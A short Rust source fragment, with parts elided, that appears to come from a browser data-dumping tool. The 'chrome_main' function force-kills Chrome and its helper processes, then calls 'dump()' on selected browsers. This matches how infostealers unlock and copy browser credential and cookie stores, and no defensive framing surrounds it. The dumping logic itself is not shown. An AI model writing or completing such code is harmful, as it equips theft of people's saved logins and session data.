...
pub fn chrome_main() -> Vec<Dumper> {
        ...
        let processes_google: Vec<&str> = vec!["chrome.exe", "chrome_proxy.exe", "chrome_pwa_launcher.exe", "elevation_service.exe", "notification_helper.exe"];
        for (_pid, process) in sys.processes() {
            let name = process.name();
            if processes_google.contains(&name) {
                process.kill();
    ...
    opt_browsers.into_iter().filter_map(|v| browsers.get(v.as_str()).cloned()).map(|mut v| v.dump().map(|_| v)).filter_map(|v| v.ok()).collect::<Vec<_>>()
}
